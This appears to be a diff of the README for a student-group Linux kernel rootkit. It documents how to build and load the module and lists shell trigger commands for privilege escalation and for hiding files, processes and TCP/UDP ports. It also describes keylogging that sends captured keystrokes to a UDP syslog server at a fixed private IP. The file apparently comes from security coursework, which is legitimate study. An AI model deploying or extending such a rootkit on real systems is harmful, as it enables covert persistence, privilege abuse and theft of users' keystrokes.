@@ -1,10 +1,10 @@
 Module Description:
 
-This kernel module hides a tcp/udp ipv4 socket (from ss & netstat). The user has to specify protocol and port number when loading the module.
+This module combines a covert communications channel with privilege escalation, udp logging and file/process/socket hiding.
 Tested in Linux Debian 3.16.4 x86_64.
 
 Files inside :
-        1. hide_socket.c and other source-/header-files - the LKM
+        1. A bunch of source and header files. Name indicates what it does. 
         2. gensysmap.sh - bash script to generate sysmap.h
         3. Makefile - the Makefile
         4. README - what you are reading right now
@@ -16,20 +16,21 @@ How to use:
         $ make
         > rootkit_group4.ko and other object files will be created.
 
-2. (Optional step) : Check the socket information
-        $ netstat -tuan
-        $ ss -tuan
+2. Load the LKM.
+        $ insmod rootkit_group4.ko
+	
+3. Commands available from the shell:
+There are a number of commands available. All start with f7R_ to avoid users accidentally triggering them. They just have to be typed in the shell and
+will be executed immediately after typing is finished (without the need to hit enter).
+General usage: 'f7R_<COMMAND_NAME> <PARAMETER>;'
+E.g.:
+	'f7R_hide_file /root/hidden_file;'	(YOU ALWAYS NEED TO SPECIFY THE FULL PATH!)
+	'f7R_unhide_file /root/hidden_file;'
+	'f7R_escalate;'		-- privilege escalation in the current shell
+	'f7R_hide_process 1324'
+	'f7R_unhide_process 1324'
+	'f7R_hide_tcp 22'
+	'f7R_hide_udp 512'
 
-3. Load the  LKM.
-        $ insmod rootkit_group4.ko protocol="$PROTO" port_number=$PORT
-        $PROTO should be equal to tcp or udp
-        $PORT is a portnumber (1-65535)
-
-4. (Optional step) : Check if the socket is hidden
-        $ netstat -tuan
-        $ ss -tuan
-		The specified port shouldn't show up in the list
-
-5. Unload the module
-        $ rmmod hidesocket
-
+4. About udp logging:
+The keylogging is done to a udp syslog server. It sends its packets to 192.168.2.4 on udp port 514. Currently this destination can only be changed by changing the code in read.c (lines 28-49).
